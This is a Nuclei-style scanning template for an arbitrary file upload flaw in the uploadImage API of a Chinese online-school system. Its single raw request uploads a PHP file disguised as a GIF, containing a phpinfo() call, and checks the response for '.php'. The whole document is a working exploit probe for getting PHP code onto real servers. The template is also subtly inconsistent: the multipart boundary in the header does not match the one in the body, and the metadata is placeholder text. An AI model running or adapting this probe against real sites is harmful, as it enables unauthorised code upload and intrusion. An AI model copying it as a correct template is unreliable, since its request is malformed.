id: ywk-uploadImage-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 云课网校系统uploadImage存在任意文件上传漏洞
  reference:
    - https://
  tags: tags
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{rand_base(8)}}"
http:
  - raw:
      - |-
        POST /api/uploader/uploadImage HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Cache-Control: no-cache
        Connection: keep-alive
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykvjj6DIn{{boundary}}
        x-requested-with: XMLHttpRequest
        Content-Length: 203

        ------WebKitFormBoundaryLZbmKeas{{boundary}}
        Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
        Content-Type: image/gif

        <?php phpinfo();?>
        ------WebKitFormBoundaryLZbmKeas{{boundary}}--
    matchers:
      - type: word
        part: body
        words:
          - '.php'
